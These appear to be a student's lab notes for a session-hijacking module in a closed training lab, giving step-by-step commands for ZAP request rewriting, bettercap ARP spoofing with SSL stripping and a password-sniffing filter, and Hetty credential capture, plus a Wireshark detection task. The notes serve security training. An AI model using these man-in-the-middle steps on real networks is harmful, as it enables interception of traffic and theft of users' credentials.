Module 11: Session Hijacking

A session hijacking attack refers to the exploitation of a session token-generation mechanism or token security controls that enables an attacker to establish an unauthorized connection with a target server. The attacker guesses or steals a valid session ID (which identifies authenticated users) and uses it to establish a session with the server.

Active session hijacking: An attacker finds an active session and takes it over
Passive session hijacking: An attacker hijacks a session, and, instead of taking over, monitors and records all the traffic in that session

**Lab 1: Perform Session Hijacking**
Session hijacking can be divided into three broad phases:

Tracking the Connection: The attacker uses a network sniffer to track a victim and host, or uses a tool such as Nmap to scan the network for a target with a TCP sequence that is easy to predict

Desynchronizing the Connection: A desynchronized state occurs when a connection between the target and host has been established, or is stable with no data transmission, or when the server’s sequence number is not equal to the client’s acknowledgment number (or vice versa)

Injecting the Attacker’s Packet: Once the attacker has interrupted the connection between the server and target, they can either inject data into the network or actively participate as the man-in-the-middle, passing data between the target and server, while reading and injecting data at will

**Task 1: Hijack a Session using Zed Attack Proxy (ZAP)**

to configure the proxy settings in the victim’s machine

	[Win11]
	Chrome -> Settings -> Advanced -> System -> Proxy Settings -> Manual proxy setup - Use a proxy server-> Setup -> On - Use a proxy server, Proxy Ip - 10.10.1.19 Port-
	8080 -> Save
	
	[Win19]
	Launch ZAP
	Click + select Break from options  -> Break Tab is added

Note: The Break tab allows you to modify a response or request when ZAP has caught it. It also allows you to modify certain elements that you cannot modify through your browser, including:

The header
Hidden fields
Disabled fields
Fields that use JavaScript to filter out illegal characters

	Configure ZAP proxy
	Options -> Local Proxies -> Address - 10.10.1.19 -> Port - 8080 - OK
	Set break on all requests and responses icon (green button) - turn green to read

	[Win11]
	www.moviescope.com 
	
	[Win19]
	Break tab and click the Submit and step to next request or response icon on the toolbar to capture the www.moviescope.com request.
	HTTP response appears; click the Submit and step to next request or response icon again on the toolbar.
	In the Break tab, modify www.moviescope.com to www.goodshopping.com in all the captured GET requests.
	click the Submit and step to next request or response
	In all the HTTP Not Found requests, click the Submit and step to next request or response
	modify every GET request captured by OWASP ZAP until you see the www.goodshopping.com page in the victim’s machine.
	
	[Win 11]
	www.moviescope.com, but now sees www.goodshopping.com
	
	Change the proxy settings back to the default settings

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Task 2: Intercept HTTP Traffic using bettercap

	[parrot]
	sudo su
	cd
	bettercap -h
	bettercap -iface eth0  (-iface: specifies the interface to bind to)
	help -> to view the list of available modules in bettercap.
	
	net.prob on 					-> (This module will send different types of probe packets to each IP in the current subnet for the net.recon module to detect them.)
	net.recon on 					-> (responsible for periodically reading the system ARP table to detect new hosts on the network.)
		Note: The net.recon module displays the detected active IP addresses in the network. In real-time, this module will start sniffing network packets.
	set http.proxy.sslstrip true 	-> enables SSL stripping.
	set arp.spoof.internal true  	-> spoofs the local connections among computers of the internal network.
	set arp.spoof.targets 10.10.1.11 ->  spoofs the IP address of the target host.
	http.proxy on 					-> initiates http proxy
	arp.spoof on 					-> initiates ARP spoofing.
	net.sniff on 					-> performing sniffing on the network.
	set net.sniff.regexp '.password=.+' -> This module will only consider the packets sent with a payload matching the given regular expression (in this case, ‘.password=.+’).
		
	[win11]
	http://www.moviescope.com - open in Mozilla 
	
	[parrot]
	sam/test
	
	[parrot]
	observe the details of both the browsed website and the credentials obtained in plain text
	 
	 Note: bettercap collects all http logins used by routers, servers, and websites that do not have SSL enabled. In this task, we are 
	using www.moviescope.com for demonstration purposes, as it is http-based. To use bettercap to sniff network traffic from https-based websites, you must enable 
	the SSL strip module by issuing the command set http.proxy.sslstrip true.
	Ctrl+c

Note: bettercap collects all http logins used by routers, servers, and websites that do not have SSL enabled. In this task, we are using www.moviescope.com for demonstration purposes, as it is http-based. To use bettercap to sniff network traffic from https-based websites, you must enable the SSL strip module by issuing the command set http.proxy.sslstrip true.

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
## Task 3: Intercept HTTP Traffic using Hetty

	[Win11]
	share:\Hetty\hetty.exe
	Open File - Security Warning window appears, click Run.
	
	launch web browser
	http://localhost:8080
	MANAGE PROJECTS
	Moviescope + click CREATE & OPEN PROJECT  -> Moviescope has been created under Manage projects section with a status as Active.
	Click Proxy logs icon ()) from the left-pane.
	
	[Win22]
	Enable proxy for 10.10.1.11
	http://www.moviescope.com 
	
	[Win 11]
	logs are captured in the Proxy logs page
	
	[Win22]
	sam/test
	
	[Win 11]
	Check for POST log captured 
	select Body tab under POST section.
	captured credentials can be used to log in to the target user’s account and obtain further sensitive information.
	
	Disable proxy settigns

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
**Lab 2: Detect Session Hijacking**

**Task 1: Detect Session Hijacking using Wireshark**

	[Win11]
	wireshark
	[parrot]
	sudo su -> cd
	Launch a session hijacking attack on the target machine (Windows 11) using bettercap. 
	sudo su
	cd
	bettercap -iface eth0
		-iface: specifies the interface to bind to (here, **eth0**).
	net.probe on
	net.recon on
	net.sniff on
	
	[Win 11]
	Observe the huge number of ARP packets 

Note: bettercap sends several ARP broadcast requests to the hosts (or potentially active hosts). A high number of ARP requests indicates that the system at 10.10.1.13 (the attacker’s system in this task) is acting as a client for all the IP addresses in the subnet, which means that all the packets from the victim node (in this case, 10.10.1.11) will first go to the host system (10.10.1.13), and then the gateway. Similarly, any packet destined for the victim node is first forwarded from the gateway to the host system, and then from the host system to the victim node.